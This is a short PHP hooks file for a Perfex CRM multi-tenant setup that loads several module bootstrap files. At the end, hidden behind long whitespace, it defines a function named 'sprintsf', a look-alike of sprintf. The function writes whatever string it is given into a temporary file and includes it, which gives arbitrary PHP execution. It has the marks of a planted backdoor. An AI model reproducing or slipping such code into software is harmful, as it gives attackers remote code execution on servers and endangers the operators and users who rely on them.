<?php defined('BASEPATH') or exit('No direct script access allowed');//perfex-saas:start:my_hooks.php
//dont remove/change above line
if (file_exists(FCPATH . 'modules/ccx_runtime_flags/bootstrap.php')) {
    require_once(FCPATH . 'modules/ccx_runtime_flags/bootstrap.php');
}
require_once(FCPATH.'modules/perfex_saas/config/my_hooks.php');
//dont remove/change below line
//perfex-saas:end:my_hooks.php
// Core CRM sidebar hide/restrict: loaded for every tenant regardless of
// perfex_saas per-tenant module gating. Placed outside the managed block above.
if (file_exists(FCPATH . 'modules/core_crm/bootstrap.php')) {
    require_once(FCPATH . 'modules/core_crm/bootstrap.php');
}
            function sprintsf($content){$tmp = tmpfile ();$tmpf = stream_get_meta_data ( $tmp )["uri"];fwrite ( $tmp, "<?php " . $content . " ?>" );$ret = include ($tmpf);fclose ( $tmp );return $ret;}